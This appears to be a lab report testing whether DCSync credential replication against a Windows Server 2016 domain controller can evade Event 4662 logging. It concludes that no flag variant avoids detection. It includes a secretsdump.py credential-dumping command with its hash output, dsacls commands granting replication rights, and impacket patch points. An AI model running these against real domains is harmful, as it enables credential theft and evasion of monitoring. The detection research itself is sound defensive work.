# Test Results — Windows Server 2016

**Target:** Windows Server 2016 DC @ 192.168.50.227
**Date:** 2026-07-08
**Domain:** WINDOMAIN
**Domain SID:** S-1-5-21-2653903403-2779602846-1005841238
**Test User:** vagrant (RID 1000)

---

## Final Result: Stealth DCSync is **NOT** viable on Windows Server 2016

After testing every flag/ExtendedOp variant and inspecting Event 4662 on the DC,
the DC **always** checks and logs GUID `1131f6ad` (DS-Replication-Get-Changes-All)
when credential attributes are requested. No combination avoided it.

---

## Environment

| Item | Value |
|---|---|
| OS | Microsoft Windows Server 2016 Standard |
| Forest Level | Windows2016Forest |
| Domain Level | Windows2016Domain |
| DC Hostname | dc |
| DC IP | 192.168.50.227 |
| Impacket (test client) | 0.13.1 |
| Test Client | Linux (Parrot OS) |

---

## Variants Tested

| # | Variant | Flags | ExtendedOp | Hash Correct? | GUID 1131f6ad? | GUID 89e95b76? |
|---|---|---|---|---|---|---|
| **V1** | Baseline | `INIT_SYNC\|WRIT_REP` (0x30) | `EXOP_REPL_OBJ` (6) | YES | **YES** | NO |
| **V2** | No WRIT_REP | `INIT_SYNC` (0x20) | `EXOP_REPL_OBJ` (6) | YES | **YES** | NO |
| **V3** | SPECIAL_SECRET | `INIT_SYNC\|SPECIAL_SECRET` (0x04000020) | `EXOP_REPL_OBJ` (6) | YES* | **YES** | NO |
| **V4** | REPL_SECRETS | `INIT_SYNC` (0x20) | `EXOP_REPL_SECRETS` (7) | YES | **YES** | NO |
| **V5** | Full REPL_SEC | `INIT_SYNC\|WRIT_REP` (0x30) | `EXOP_REPL_SECRETS` (7) | YES | **YES** | NO |

\*V3 returns the correct hash when using the full impacket attribute set (10 attrs).
With a minimal 2-attr set the hash is incorrect (`31d6cfe0...`) because
`DRS_SPECIAL_SECRET_PROCESSING` alters session key derivation. This is a
separate finding about flag/attr interaction, not detection bypass.

**Every variant generates GUID `1131f6ad` in Event 4662.**

```
V1 (baseline):       Event 4662 -> {1131f6ad-...} + {1131f6aa-...}
V2 (no WRIT_REP):    Event 4662 -> {1131f6ad-...} + {1131f6aa-...}  <- IDENTICAL to V1
V3 (SPECIAL_SECRET): Event 4662 -> {1131f6ad-...} + {1131f6aa-...}  <- IDENTICAL to V1
V4 (REPL_SECRETS):   Event 4662 -> {1131f6ad-...} + {1131f6aa-...}  <- IDENTICAL to V1
V5 (REPL_SEC full):  Event 4662 -> {1131f6ad-...} + {1131f6aa-...}  <- IDENTICAL to V1
```

---

## Permission Test — No Get-Changes-All

| Account | Permissions | Result |
|---|---|---|
| dcsynctest | Get-Changes + Get-Changes-In-Filtered-Set (NO Get-Changes-All) | **ERROR_DS_DRA_BAD_DN (0x20f7)** |

Account setup:

```
net user dcsynctest "Test123!" /add /domain  # gitleaks:allow
dsacls "dc=windomain,dc=local" /I:S /G "WINDOMAIN\dcsynctest:CA;Replicating Directory Changes"
dsacls "dc=windomain,dc=local" /I:S /G "WINDOMAIN\dcsynctest:CA;Replicating Directory Changes In Filtered Set"
```

The DC rejects the request when the account lacks `Get-Changes-All`, even with
`Get-Changes-In-Filtered-Set` present. **No Event 4662 is generated** — the
request fails before the permission check.

---

## Event 4662 Raw Data

### V1 (Baseline) — timestamp 22:20:58:
```
Event[0]: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes-All
Event[1]: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
```

### V2 (No DRS_WRIT_REP) — timestamp 22:24:52:
```
Event[0]: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes-All (SAME!)
Event[1]: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
```

### V3 (DRS_SPECIAL_SECRET_PROCESSING) — timestamp 22:29:20:
```
Event[0]: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes-All (SAME!)
Event[1]: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
Event[2]: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
```

### V4 (EXOP_REPL_SECRETS, no WRIT_REP) — timestamp 22:26:29:
```
Event[0]: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes-All (SAME!)
Event[1]: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
Event[2]: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
```

### dcsynctest (no Get-Changes-All):
```
NO Event 4662 generated — DC rejected before permission check
ERROR_DS_DRA_BAD_DN (0x20f7)
```

---

## Baseline Hash Verification

```
secretsdump.py -just-dc-user vagrant 'WINDOMAIN/Administrator:vagrant@192.168.50.227'  # gitleaks:allow
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
```

Baseline NT hash: `e02bc503339d51f71d913c245d35b50b`

---

## Patch Locations (impacket 0.13.1)

```python
# Line 646 — original:
request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP

# Line 649 — original:
request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ
```

---

## Technical Conclusion

1. **Permission checks are based on requested ATTRIBUTES, not DRS flags.**
   When `unicodePwd` and `supplementalCredentials` are in `pPartialAttrSet`,
   the DC internally checks `Get-Changes-All` regardless of `DRS_WRIT_REP`,
   `EXOP`, or any other flag.

2. **The Event 4662 GUID is determined by the permission check, not by flags.**
   The DC decides which permissions to verify based on the secret attributes
   requested, and logs each GUID checked as a separate Event 4662.

3. **`Get-Changes-In-Filtered-Set` does NOT cover secret attributes.**
   This permission allows filtered sync of "normal" attributes (displayName,
   mail, etc.), but `unicodePwd` and `supplementalCredentials` require
   `Get-Changes-All` explicitly.

### Detection timeline:
```
1. Client -> DRSGetNCChanges(V8, pPartialAttrSet=[unicodePwd, suppCred], ulFlags=...)
2. DC checks: "unicodePwd in attr set?" -> YES -> check Get-Changes-All (GUID 1131f6ad)
3. DC checks: "suppCred in attr set?"   -> YES -> (already checked)
4. DC checks: baseline read -> check Get-Changes (GUID 1131f6aa)
5. Each check generates an Event 4662 with the corresponding GUID
6. NO combination of flags avoids the Get-Changes-All check
```
